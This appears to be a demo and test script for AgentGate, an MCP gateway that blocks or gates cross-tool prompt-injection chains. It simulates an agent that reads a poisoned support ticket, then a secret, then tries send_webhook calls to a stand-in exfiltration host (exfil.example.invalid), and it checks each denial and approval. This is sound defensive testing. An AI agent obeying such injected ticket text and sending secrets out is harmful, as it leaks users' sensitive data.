// AgentGate — Context Guard Poisoned-Result Demo (Milestone 7, ADR-0013)
//
// Demonstrates AgentGate's defense against the MCP "confused deputy" /
// cross-tool indirect-prompt-injection pattern: an agent reads untrusted
// content from one tool (a support ticket) that embeds an instruction
// telling it to read sensitive data with a second tool and exfiltrate it
// with a third — where each individual call looks policy-legal in
// isolation, and only the SEQUENCE is the actual attack. This demo never
// calls an LLM: no model is involved anywhere in this script. It manually
// issues the exact tool-call sequence a compromised agent WOULD issue if it
// had "obeyed" the injected instruction, and proves Context Guard's
// cross-tool session-risk rules block/gate the final step regardless of
// whether any model actually reasoned about the injected text — because
// AgentGate never reads or inspects model reasoning at all (ADR-0013
// point 2); it only observes gateway-visible tool calls and results.
//
// Flow (numbered to match the milestone's required proof points):
//   1. Real, production-built gateway (packages/gateway/dist), a deny-by-
//      default policy, a real downstream MCP fixture server, and
//      persistent, process-external call counters — one per tool.
//   2-3. Connect a real MCP SDK client over stdio; the new execution
//        context begins at revision 0 with no labels.
//   4-7. fetch_ticket (untrusted_content source) returns the synthetic
//        indirect-prompt-injection ticket body; prove the counter is 1,
//        the context revision/labels advanced, and the raw ticket text
//        never reaches Context Guard's own CLI/API/stored state.
//   8-9. read_secret_fixture (sensitive_read) returns a synthetic secret;
//        prove the counter is 1, both labels are now active, and the
//        secret never reaches Context Guard's own CLI/API/stored state.
//  10-13. send_webhook (external_communication) is attempted twice — once
//         fresh, once by the same cached tool name — and DENIED both
//         times by a contextual rule triggered by the accumulated risk
//         labels; the external-send counter stays exactly 0 both times
//         (zero-contact proof).
//  14-16. A SECOND, independent gateway connection/context (proving no
//         label inheritance) demonstrates the REQUIRE_APPROVAL path: a
//         pending contextual approval created against one context
//         revision is proven to fail revalidation with counter 0 once the
//         context has since advanced (stale-binding proof); a FRESH
//         approval created against the CURRENT revision is approved and
//         the counter becomes exactly 1; a third attempt proves the
//         approval was single-use and required its own fresh evaluation.
//  17. The second context's initial state (revision 0, no labels) already
//      proves it did not inherit the first context's accumulated risk.
//  18-19. CLI evidence (`agentgate context status/history/explain/verify`)
//         shows safe, bounded status/history/explanation/verification
//         output for both contexts.
//  20. Asserts the synthetic secret and the raw injected-instruction text
//      never appear in any CLI output, JSON, or stored context_events row
//      this script can observe.
//  21. Every client/transport/database/process is closed and every
//      temporary file removed in `finally`, on success AND failure.
//
// Deterministic, fully offline, synthetic data only. Never calls
// process.exit() directly — only ever sets process.exitCode.

import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StdioClientTransport } from '@modelcontextprotocol/sdk/client/stdio.js';
import { execFileSync } from 'node:child_process';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import fs from 'node:fs';
import fsp from 'node:fs/promises';
import os from 'node:os';
import { SYNTHETIC_SECRET, INJECTED_INSTRUCTION_PHRASE, TICKET_BODY } from './fixtures/constants.mjs';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(__dirname, '../../');
const CLI_BIN = path.join(ROOT, 'packages/gateway/dist/cli.js');
const FIXTURE_SERVER = path.join(__dirname, 'fixtures/context-poisoning-fixture-server.mjs');

// Previously-unused port pair, distinct from every other example's fixed
// ports (4337-4344) — see examples/*/demo.mjs. Two independent gateway
// processes are used (context A, context B), each with its own pair.
const GATEWAY_PORT_A = 4345;
const CONTROL_PORT_A = 4346;
const GATEWAY_PORT_B = 4347;
const CONTROL_PORT_B = 4348;

function toYamlPath(p) {
  return p.split(path.sep).join('/');
}

function assertInsideTempDir(tmpDir, target) {
  const resolvedTmpDir = path.resolve(tmpDir);
  const resolvedTarget = path.resolve(target);
  if (resolvedTarget !== resolvedTmpDir && !resolvedTarget.startsWith(resolvedTmpDir + path.sep)) {
    throw new Error(`Refusing to remove path outside the demo's temp directory: ${resolvedTarget} (expected under ${resolvedTmpDir})`);
  }
  return resolvedTarget;
}

function safeRemoveFile(tmpDir, target) {
  const resolved = assertInsideTempDir(tmpDir, target);
  try {
    if (fs.existsSync(resolved)) fs.rmSync(resolved, { force: true });
  } catch (err) {
    console.warn(`[cleanup] Could not remove ${resolved}: ${err.message}`);
  }
}

function readCounter(counterDir, toolName) {
  try {
    return parseInt(fs.readFileSync(path.join(counterDir, `${toolName}.count`), 'utf8'), 10) || 0;
  } catch {
    return 0;
  }
}

function check(label, condition) {
  console.log(`${condition ? '✅ PASS' : '❌ FAIL'} — ${label}`);
  return Boolean(condition);
}

function runCli(args, cwd) {
  let stdout = '';
  let ok = true;
  try {
    stdout = execFileSync(process.execPath, [CLI_BIN, ...args], { cwd, encoding: 'utf8' });
  } catch (err) {
    ok = false;
    stdout = String(err.stdout ?? err.message ?? '');
  }
  return { ok, stdout };
}

function runCliJson(args, cwd) {
  const { ok, stdout } = runCli(args, cwd);
  let json = {};
  try {
    json = JSON.parse(stdout);
  } catch {
    // handled by caller assertions
  }
  return { ok, stdout, json };
}

async function waitFor(fn, timeoutMs, label) {
  const deadline = Date.now() + timeoutMs;
  for (;;) {
    const v = fn();
    if (v !== undefined) return v;
    if (Date.now() >= deadline) throw new Error(`waitFor(${label}) timed out after ${timeoutMs}ms`);
    await new Promise((r) => setTimeout(r, 100));
  }
}

async function main() {
  const tmpDir = await fsp.mkdtemp(path.join(os.tmpdir(), 'agentgate-context-poisoning-'));

  const policyPath = path.join(tmpDir, 'policy.yml');
  const dbPath = path.join(tmpDir, 'agentgate.sqlite');
  const counterDir = path.join(tmpDir, 'counters');
  fs.mkdirSync(counterDir);
  const configPathA = path.join(tmpDir, 'agentgate-a.yml');
  const configPathB = path.join(tmpDir, 'agentgate-b.yml');

  let clientA;
  let transportA;
  let clientB;
  let transportB;
  let storage;
  let approvalManager;
  const results = [];
  // Every CLI/JSON string this script captures, for the final safety sweep
  // (step 20) — never printed with full raw ticket/secret content, but
  // scanned afterward to prove neither ever appears anywhere observable.
  const capturedOutputs = [];
  function capture(text) {
    capturedOutputs.push(text);
    return text;
  }

  try {
    // ── Step 1: deny-by-default policy, config, fixture ──────────────────
    fs.writeFileSync(
      policyPath,
      'version: 1\n' +
        'defaults:\n' +
        '  decision: deny\n' +
        'rules:\n' +
        '  - id: allow-fetch-ticket\n' +
        '    tools: ["fetch_ticket"]\n' +
        '    decision: allow\n' +
        '  - id: allow-read-secret\n' +
        '    tools: ["read_secret_fixture"]\n' +
        '    decision: allow\n' +
        '  - id: allow-send-webhook\n' +
        '    tools: ["send_webhook"]\n' +
        '    decision: allow\n'
    );

    const CONTEXT_GUARD_TOOLS_BLOCK =
      'context_guard:\n' +
      '  mode: enforce\n' +
      '  tools:\n' +
      '    fetch_ticket:\n' +
      '      adds_on_result: [untrusted_content]\n' +
      '    read_secret_fixture:\n' +
      '      effects: [sensitive_read]\n' +
      '      adds_on_result: [sensitive_data_accessed]\n' +
      '    send_webhook:\n' +
      '      effects: [external_communication]\n';

    fs.writeFileSync(
      configPathA,
      `version: 1\n` +
        `gateway_port: ${GATEWAY_PORT_A}\n` +
        `control_port: ${CONTROL_PORT_A}\n` +
        `policy: ${toYamlPath(policyPath)}\n` +
        `db_path: ${toYamlPath(dbPath)}\n` +
        `tool_integrity:\n  mode: disabled\n` +
        CONTEXT_GUARD_TOOLS_BLOCK +
        `  rules:\n` +
        `    - id: deny-external-after-risk\n` +
        `      when:\n` +
        `        context_has_any: [untrusted_content, sensitive_data_accessed]\n` +
        `        target_has_any: [external_communication]\n` +
        `      action: deny\n` +
        `      reason: "External communication blocked: untrusted or sensitive content was accessed earlier in this session."\n` +
        `servers:\n  - id: fixture\n    transport: stdio\n    command: node\n    args: ["${toYamlPath(FIXTURE_SERVER)}"]\n` +
        `    env:\n      FIXTURE_COUNTER_DIR: "${toYamlPath(counterDir)}"\n`
    );

    fs.writeFileSync(
      configPathB,
      `version: 1\n` +
        `gateway_port: ${GATEWAY_PORT_B}\n` +
        `control_port: ${CONTROL_PORT_B}\n` +
        `policy: ${toYamlPath(policyPath)}\n` +
        `db_path: ${toYamlPath(dbPath)}\n` +
        `tool_integrity:\n  mode: disabled\n` +
        CONTEXT_GUARD_TOOLS_BLOCK +
        `  rules:\n` +
        `    - id: approve-external-after-risk\n` +
        `      when:\n` +
        `        context_has_any: [untrusted_content, sensitive_data_accessed]\n` +
        `        target_has_any: [external_communication]\n` +
        `      action: require_approval\n` +
        `      reason: "External communication requires approval: untrusted or sensitive content was accessed earlier in this session."\n` +
        `      approval_ttl_seconds: 20\n` +
        `servers:\n  - id: fixture\n    transport: stdio\n    command: node\n    args: ["${toYamlPath(FIXTURE_SERVER)}"]\n` +
        `    env:\n      FIXTURE_COUNTER_DIR: "${toYamlPath(counterDir)}"\n`
    );

    console.log('═══════════════════════════════════════════════════════════════════');
    console.log('  AgentGate — Context Guard Demo: Cross-Tool Prompt-Injection Chain  ');
    console.log('═══════════════════════════════════════════════════════════════════\n');
    console.log('No LLM is used anywhere in this script — it manually issues the exact');
    console.log('tool-call sequence a compromised agent would issue, and proves Context');
    console.log('Guard blocks/gates the final step from OBSERVED gateway history alone.\n');

    // ── Steps 2-3: connect, verify fresh context ──────────────────────────
    console.log('Step 1-3 — Starting gateway A (deny path) and connecting a real MCP client...');
    clientA = new Client({ name: 'context-poisoning-agent-a', version: '1.0.0' }, { capabilities: {} });
    transportA = new StdioClientTransport({ command: 'node', args: [CLI_BIN, 'start', configPathA], env: { ...process.env }, cwd: tmpDir });
    await clientA.connect(transportA);

    const statusInitial = runCliJson(['context', 'status', '--config', configPathA, '--json'], tmpDir);
    capture(statusInitial.stdout);
    results.push(check('CLI `context status` succeeded', statusInitial.ok));
    results.push(check('Exactly one context exists after connect', statusInitial.json.contexts?.length === 1));
    const contextIdA = statusInitial.json.contexts?.[0]?.context_id;
    results.push(check('Context A begins at revision 0', statusInitial.json.contexts?.[0]?.revision === 0));
    results.push(check('Context A begins with no labels', (statusInitial.json.contexts?.[0]?.labels ?? []).length === 0));

    // ── Steps 4-7: fetch_ticket (untrusted_content source) ────────────────
    console.log('\nStep 4-7 — Calling fetch_ticket: an attacker-controlled support ticket is returned...');
    const ticketResult = await clientA.callTool({ name: 'fetch_ticket', arguments: {} });
    results.push(check('fetch_ticket call succeeded', !ticketResult.isError));
    results.push(check('fetch_ticket counter is exactly 1', readCounter(counterDir, 'fetch_ticket') === 1));

    const explainAfterTicket = runCliJson(['context', 'explain', contextIdA, '--config', configPathA, '--json'], tmpDir);
    capture(explainAfterTicket.stdout);
    results.push(check('`context explain` succeeded', explainAfterTicket.ok));
    results.push(check('Context revision advanced to 1', explainAfterTicket.json.revision === 1));
    results.push(check('Label "untrusted_content" is now active', (explainAfterTicket.json.labels ?? []).includes('untrusted_content')));
    results.push(check('The raw injected-instruction text is NOT copied into Context Guard state', !explainAfterTicket.stdout.includes(INJECTED_INSTRUCTION_PHRASE)));

    // ── Steps 8-9: read_secret_fixture (sensitive_read) ────────────────────
    console.log('\nStep 8-9 — Calling read_secret_fixture (as the injected instruction directed)...');
    const secretResult = await clientA.callTool({ name: 'read_secret_fixture', arguments: {} });
    results.push(check('read_secret_fixture call succeeded', !secretResult.isError));
    results.push(check('read_secret_fixture counter is exactly 1', readCounter(counterDir, 'read_secret_fixture') === 1));

    const explainAfterSecret = runCliJson(['context', 'explain', contextIdA, '--config', configPathA, '--json'], tmpDir);
    capture(explainAfterSecret.stdout);
    const labelsAfterSecret = (explainAfterSecret.json.labels ?? []).slice().sort();
    results.push(check('Both labels are now active', JSON.stringify(labelsAfterSecret) === JSON.stringify(['sensitive_data_accessed', 'untrusted_content'])));
    results.push(check('Context revision advanced to 2', explainAfterSecret.json.revision === 2));
    results.push(check('The synthetic secret is NOT copied into Context Guard state', !explainAfterSecret.stdout.includes(SYNTHETIC_SECRET)));

    // Deterministic fault-injection hook — exists ONLY so an automated test
    // (packages/gateway/tests/context-poisoning-demo-cleanup.test.ts) can
    // prove the `finally` cleanup block below actually runs on a real
    // mid-run failure, as executable evidence rather than a `finally` block
    // only inspected by eye. Never set in normal use, so it has zero effect
    // on the demo's real behavior.
    if (process.env.CONTEXT_POISONING_INJECT_FAILURE === 'after-step-9') {
      throw new Error('injected failure: simulated fault after Step 9, for cleanup verification only');
    }

    // ── Steps 10-13: send_webhook denied twice, zero-contact proof ────────
    console.log('\nStep 10-13 — Attempting send_webhook (as the injected instruction directed)...');
    const blocked1 = await clientA.callTool({ name: 'send_webhook', arguments: { url: 'https://exfil.example.invalid/collect' } });
    results.push(check('First send_webhook attempt was DENIED', blocked1.isError === true));
    results.push(check('Deny message cites external communication being blocked', /external communication.*blocked|blocked.*external communication/i.test(String(blocked1.content?.[0]?.text ?? ''))));
    results.push(check('send_webhook counter is STILL 0 after the first attempt', readCounter(counterDir, 'send_webhook') === 0));

    console.log('Repeating the attempt by the same (cached) tool name, as a retrying agent would...');
    const blocked2 = await clientA.callTool({ name: 'send_webhook', arguments: { url: 'https://exfil.example.invalid/collect-again' } });
    results.push(check('Second (repeated/cached-name) send_webhook attempt was ALSO denied', blocked2.isError === true));
    results.push(check('send_webhook counter is STILL 0 after the repeated attempt', readCounter(counterDir, 'send_webhook') === 0));

    const explainAfterDeny = runCliJson(['context', 'explain', contextIdA, '--config', configPathA, '--json'], tmpDir);
    capture(explainAfterDeny.stdout);
    results.push(check('`context explain` reports the latest decision as "deny"', explainAfterDeny.json.latest_decision?.action === 'deny'));
    results.push(check('The matched contextual rule is reported', explainAfterDeny.json.latest_decision?.rule_id === 'deny-external-after-risk'));
    results.push(check('Context revision is unaffected by denied attempts (stays 2)', explainAfterDeny.json.revision === 2));

    const historyA = runCliJson(['context', 'history', contextIdA, '--config', configPathA, '--json'], tmpDir);
    capture(historyA.stdout);
    results.push(check('`context history` succeeded and the chain verifies', historyA.ok && historyA.json.chain_valid === true));
    // Every contextually-evaluated call gets a call_evaluated event
    // regardless of outcome (ADR-0013 point 8) — fetch_ticket and
    // read_secret_fixture are evaluated too (no matching rule, so no
    // escalation), so this checks the send_webhook-specific subset, not
    // the total.
    const sendWebhookEvaluations = (historyA.json.events ?? []).filter((e) => e.event_type === 'call_evaluated' && e.tool_name === 'send_webhook');
    results.push(check('History includes exactly 2 call_evaluated events for send_webhook (both denials)', sendWebhookEvaluations.length === 2));
    results.push(check('Both send_webhook evaluations recorded a "deny" action', sendWebhookEvaluations.every((e) => e.action === 'deny')));

    // ── Close context A ────────────────────────────────────────────────────
    console.log('\nClosing connection A (finalizes context A)...');
    await clientA.close().catch(() => {});
    await transportA.close().catch(() => {});
    clientA = undefined;
    transportA = undefined;

    const { AuditStorage } = await import('../../packages/gateway/dist/storage.js');
    const { ApprovalManager } = await import('../../packages/gateway/dist/approval.js');
    storage = new AuditStorage(dbPath);
    const closedA = await waitFor(() => {
      const s = storage.getContextState(contextIdA);
      return s && s.status !== 'active' ? s : undefined;
    }, 10000, 'context A finalized after transport close');
    results.push(check('Context A transitioned to "closed" after the connection ended', closedA.status === 'closed'));

    // ── Steps 14-17: fresh context, approval path ──────────────────────────
    console.log('\nStep 14-17 — Starting gateway B (approval path) — a SEPARATE, independent context...');
    clientB = new Client({ name: 'context-poisoning-agent-b', version: '1.0.0' }, { capabilities: {} });
    transportB = new StdioClientTransport({ command: 'node', args: [CLI_BIN, 'start', configPathB], env: { ...process.env }, cwd: tmpDir });
    await clientB.connect(transportB);

    const allContexts = storage.listContextStates();
    const contextB = allContexts.find((c) => c.context_id !== contextIdA);
    results.push(check('A NEW, distinct context id was created for connection B', Boolean(contextB) && contextB.context_id !== contextIdA));
    results.push(check('Context B begins at revision 0 — it does NOT inherit context A\'s revision', contextB?.revision === 0));
    results.push(check('Context B begins with NO labels — it does NOT inherit context A\'s risk labels', (contextB?.labels ?? []).length === 0));
    const contextIdB = contextB.context_id;

    approvalManager = new ApprovalManager(storage);

    // Accumulate one risk label on B so send_webhook becomes contextually gated.
    const secretResultB = await clientB.callTool({ name: 'read_secret_fixture', arguments: {} });
    results.push(check('read_secret_fixture on context B succeeded', !secretResultB.isError));
    results.push(check('read_secret_fixture counter is now 2 (1 from A + 1 from B)', readCounter(counterDir, 'read_secret_fixture') === 2));

    // Call #1: send_webhook -> creates approval P1 bound to the CURRENT
    // context revision (1). Don't await the call yet — the gateway is
    // polling for a human decision.
    const call1Promise = clientB.callTool({ name: 'send_webhook', arguments: { url: 'https://exfil.example.invalid/a' } });
    const approvalP1 = await waitFor(() => storage.listPendingApprovals().find((a) => a.scope === 'send_webhook'), 10000, 'pending approval P1');
    results.push(check('Pending approval P1 is bound to context B at its current revision (1)', approvalP1.context_revision === 1));

    // Advance the context revision WHILE P1 is still pending, via a second,
    // concurrent call — proving the exact create-time/consume-time window
    // ADR-0013 point 10 closes.
    const ticketResultB = await clientB.callTool({ name: 'fetch_ticket', arguments: {} });
    results.push(check('fetch_ticket on context B succeeded (advances the context while P1 is pending)', !ticketResultB.isError));
    const advanced = await waitFor(() => {
      const s = storage.getContextState(contextIdB);
      return s.revision > 1 ? s : undefined;
    }, 10000, 'context B revision advanced past P1\'s bound revision');
    results.push(check('Context B revision advanced to 2 while P1 was still pending', advanced.revision === 2));

    // Approve P1 anyway — revalidation at consumption time must reject it.
    const approveP1 = approvalManager.approve(approvalP1.id);
    results.push(check('Approving P1 itself succeeds (the approval record resolves)', approveP1.ok === true));
    const call1Result = await call1Promise;
    results.push(check('...but EXECUTION is refused on revalidation — the context advanced since P1 was created (stale-binding proof)', call1Result.isError === true));
    results.push(check('send_webhook counter is STILL 0 after the stale-approval attempt', readCounter(counterDir, 'send_webhook') === 0));

    // Call #2: a FRESH send_webhook attempt creates a NEW approval P2, bound
    // to the NOW-current revision (2) — never reuses P1.
    const call2Promise = clientB.callTool({ name: 'send_webhook', arguments: { url: 'https://exfil.example.invalid/b' } });
    const approvalP2 = await waitFor(() => storage.listPendingApprovals().find((a) => a.scope === 'send_webhook'), 10000, 'pending approval P2');
    results.push(check('A FRESH approval P2 was created (not P1 reused)', approvalP2.id !== approvalP1.id));
    results.push(check('P2 is bound to the CURRENT revision (2)', approvalP2.context_revision === 2));

    const approveP2 = approvalManager.approve(approvalP2.id);
    results.push(check('Approving P2 succeeds', approveP2.ok === true));
    const call2Result = await call2Promise;
    results.push(check('EXECUTION succeeds — the approval matches current context state exactly', !call2Result.isError));
    results.push(check('send_webhook counter becomes EXACTLY 1 (one real, approved execution)', readCounter(counterDir, 'send_webhook') === 1));

    // A THIRD attempt must undergo fresh evaluation, not silently reuse P2
    // (single-use proof), and labels must remain active (not cleared by
    // approval consumption).
    const stateAfterP2 = storage.getContextState(contextIdB);
    results.push(check('Labels remain active after approval consumption (not silently cleared)', stateAfterP2.labels.slice().sort().join(',') === 'sensitive_data_accessed,untrusted_content'));
    results.push(check('P2 is marked consumed (single-use)', storage.getApproval(approvalP2.id).consumed === true));

    const call3Promise = clientB.callTool({ name: 'send_webhook', arguments: { url: 'https://exfil.example.invalid/c' } });
    const approvalP3 = await waitFor(() => storage.listPendingApprovals().find((a) => a.scope === 'send_webhook'), 10000, 'pending approval P3');
    results.push(check('A THIRD, fresh approval P3 was required (P2 was not silently reused)', approvalP3.id !== approvalP2.id));
    approvalManager.deny(approvalP3.id);
    const call3Result = await call3Promise;
    results.push(check('Denying P3 refuses the third call', call3Result.isError === true));
    results.push(check('send_webhook counter stays EXACTLY 1 (P3 denial did not execute)', readCounter(counterDir, 'send_webhook') === 1));

    // ── Steps 18-20: CLI/API evidence + final safety sweep ────────────────
    console.log('\nStep 18-20 — Gathering CLI evidence and running the final safety sweep...');
    const statusB = runCliJson(['context', 'status', '--config', configPathB, '--json'], tmpDir);
    capture(statusB.stdout);
    results.push(check('`context status` for gateway B succeeded', statusB.ok));

    const verifyA = runCli(['context', 'verify', '--config', configPathA], tmpDir);
    capture(verifyA.stdout);
    results.push(check('`agentgate context verify` (chain A) exited successfully', verifyA.ok));

    const chainCheck = storage.verifyContextChain();
    results.push(check('Context Guard hash chain independently verifies as valid', chainCheck.valid === true));
    const auditChainCheck = storage.verifyChain();
    results.push(check('Audit chain independently verifies as valid', auditChainCheck.valid === true));

    const historyAll = storage.listContextEvents({});
    const rawEventsText = JSON.stringify(historyAll);
    results.push(check('The synthetic secret NEVER appears in ANY stored context_events row', !rawEventsText.includes(SYNTHETIC_SECRET)));
    results.push(check('The raw injected-instruction phrase NEVER appears in ANY stored context_events row', !rawEventsText.includes(INJECTED_INSTRUCTION_PHRASE)));
    results.push(check('The full raw ticket body NEVER appears in ANY stored context_events row', !rawEventsText.includes(TICKET_BODY)));

    const allCapturedText = capturedOutputs.join('\n');
    results.push(check('The synthetic secret NEVER appears in ANY captured CLI output', !allCapturedText.includes(SYNTHETIC_SECRET)));
    results.push(check('The raw injected-instruction phrase NEVER appears in ANY captured CLI output', !allCapturedText.includes(INJECTED_INSTRUCTION_PHRASE)));

    const allPassed = results.every(Boolean);
    console.log('');
    if (allPassed) {
      console.log('🎉 ALL TESTS PASSED. Context Guard blocked the cross-tool exfiltration chain');
      console.log('   (deny path) and gated it behind exact, revision-bound approval (approval');
      console.log('   path), from observed gateway history alone — no LLM was ever involved.');
    } else {
      console.error('❌ One or more assertions failed — see PASS/FAIL lines above.');
    }
    process.exitCode = allPassed ? 0 : 1;
  } finally {
    // ── Close every open resource, success or failure ─────────────────────
    if (approvalManager) {
      try {
        approvalManager.destroy();
      } catch (err) {
        console.warn(`[cleanup] Error destroying ApprovalManager: ${err.message}`);
      }
    }
    if (storage) {
      try {
        storage.close();
      } catch (err) {
        console.warn(`[cleanup] Error closing audit storage: ${err.message}`);
      }
    }
    for (const client of [clientA, clientB]) {
      if (!client) continue;
      try {
        await client.close();
      } catch (err) {
        console.warn(`[cleanup] Error closing MCP client: ${err.message}`);
      }
    }
    for (const transport of [transportA, transportB]) {
      if (!transport) continue;
      try {
        await transport.close();
      } catch (err) {
        console.warn(`[cleanup] Error closing transport: ${err.message}`);
      }
    }

    // ── Remove generated fixtures — never anything outside tmpDir ─────────
    const counterFiles = fs.existsSync(counterDir) ? fs.readdirSync(counterDir).map((f) => path.join(counterDir, f)) : [];
    for (const target of [policyPath, configPathA, configPathB, dbPath, `${dbPath}-wal`, `${dbPath}-shm`, ...counterFiles]) {
      safeRemoveFile(tmpDir, target);
    }
    try {
      assertInsideTempDir(os.tmpdir(), tmpDir);
      await fsp.rm(tmpDir, { recursive: true, force: true });
    } catch (err) {
      console.warn(`[cleanup] Could not remove temp directory ${tmpDir}: ${err.message}`);
    }
  }
}

main().catch((err) => {
  console.error(err);
  process.exitCode = 1;
});
